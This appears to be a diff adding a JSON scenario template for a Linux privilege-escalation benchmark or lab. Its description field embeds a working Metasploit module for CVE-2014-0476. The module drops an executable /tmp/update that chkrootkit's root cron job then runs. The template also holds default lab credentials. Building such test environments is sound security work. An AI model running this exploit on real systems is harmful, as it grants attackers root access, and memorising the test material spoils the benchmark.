@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_38775",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: Chkrootkit - Local Privilege Escalation (Metasploit) (CVE-2014-0476;OSVDB-107710)\n\nExploit source code (38775.rb):\n```\n##\n# This module requires Metasploit: http://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass Metasploit4 < Msf::Exploit::Local\n\n  # This could also be Excellent, but since it requires\n  # up to one day to pop a shell, let's set it to Manual instead.\n  Rank = ManualRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Chkrootkit Local Privilege Escalation',\n      'Description'    => %q{\n        Chkrootkit before 0.50 will run any executable file named\n        /tmp/update as root, allowing a trivial privsec.\n\n        WfsDelay is set to 24h, since this is how often a chkrootkit\n        scan is scheduled by default.\n      },\n      'Author'         => [\n        'Thomas Stangner',        # Original exploit\n        'Julien \"jvoisin\" Voisin' # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2014-0476'],\n        ['OSVDB', '107710'],\n        ['EDB', '33899'],\n        ['BID', '67813'],\n        ['CWE', '20'],\n        ['URL', 'http://seclists.org/oss-sec/2014/q2/430']\n      ],\n      'DisclosureDate' => 'Jun 04 2014',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Privileged'     => true,\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {'WfsDelay' => 60 * 60 * 24} # 24h\n    ))\n\n    register_options([\n      OptString.new('CHKROOTKIT', [true, 'Path to chkrootkit', '/usr/sbin/chkrootkit'])\n    ])\n  end\n\n  def check\n    version = cmd_exec(\"#{datastore['CHKROOTKIT']} -V 2>&1\")\n\n    if version =~ /chkrootkit version 0\\.[1-4]/\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_warning('Rooting depends on the crontab (this could take a while)')\n\n    write_file('/tmp/update', \"#!/bin/sh\\n(#{payload.encoded}) &\\n\")\n    cmd_exec('chmod +x /tmp/update')\n    register_file_for_cleanup('/tmp/update')\n\n    print_status('Payload written to /tmp/update')\n    print_status('Waiting for chkrootkit to run via cron...')\n  end\n\nend\n```",
+  "cve": "CVE-2014-0476;OSVDB-107710",
+  "exploitdb_id": "38775",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_38775",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
